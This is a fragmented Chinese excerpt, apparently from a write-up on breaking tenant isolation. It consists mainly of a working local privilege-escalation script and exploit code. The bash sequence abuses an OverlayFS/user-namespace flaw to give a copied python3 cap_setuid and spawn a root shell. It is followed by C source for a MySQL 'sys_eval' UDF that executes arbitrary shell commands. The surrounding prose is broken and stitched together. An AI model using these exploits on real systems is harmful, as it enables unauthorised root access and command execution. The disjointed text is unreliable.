租户隔离  
被完全绕过。2026 年 10 月 22 日，我（文章作者）在安全分析师峰会（SAS 2026）的“Smash the Tenant Boundary”演讲中分享了这一案例的技术分析。

主机提权  
  
由于 konnectivity-server 默认以受限权限运行，拿到控制平面的

SaltStack  
 发起更大范围的攻击（后面细说）。  
  
目标主机是 Ubuntu 22.04，内核版本 5.15.x。由于启用了 user namespaces，  
OverlayFS  
 的一个已知缺陷提供了可行的提权路径：它允许文件在命名空间操作后保留 cap_

+eip 能力。  
  
利用这个漏洞的方法是：复制一份 python3 解释器并为其设置   
setuid  
 能力，从而获得   
root 权限  
。  
  
.  
.  
.  
bash  
  
rm -rf /tmp/lpe  
  
mkdir /tmp/lpe  
  
cd /tmp/lpe  
  
unshare -rm sh -c '  
  
　mkdir l u w m &&  
  
　cp /usr/bin/python3 l/ &&  
  
　chmod 755 l/python3 &&  
  
　setcap cap_setuid+eip l/python3 &&  
  
　mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &&  
  
　touch m/*  
  
'  
  
getcap /tmp/lpe/u/python3  
  
/tmp/lpe/u/python3 -c 'import os; os.setuid(0); os.system("id; /bin/sh")'

int sys_eval_init(UDF_INIT *initid, UDF_ARGS *args, char *message) {  
  
　if (args->arg_count != 1) {  
  
　　strcpy(message, "sys_eval requires one argument");  
  
　　return 1;  
  
　}  
  
　initid->max_length = 65535;  
  
　return 0;  
  
}

char* sys_eval(UDF_INIT *initid, UDF_ARGS *args, char *result,  
  
　　　　　　　 unsigned long *length, char *is_null, char *error) {  
  
　if (!args->args[0]) { *is_null = 1; return NULL; }  
  
　char cmd[65535];  
  
　snprintf(cmd, sizeof(cmd), "%.*s", (int)args->lengths[0], args->args[0]);  
  
　FILE *pipe = popen(cmd, "r");  
  
　if (!pipe) { *is_null = 1; return NULL; }  
  
　static char buf[65535];  
  
　size_t total = 0;  
  
　while (total < sizeof(buf)-1) {  
  
　　size_t n = fread(buf+total, 1, sizeof(buf)-1-total, pipe);  
  
　　if (n == 0) break;  
  
　　total += n;  
  
　}  
  
　pclose(pipe);  
  
　buf[total] = '\0';  
  
　*length = total;  
  
　return buf;  
  
}
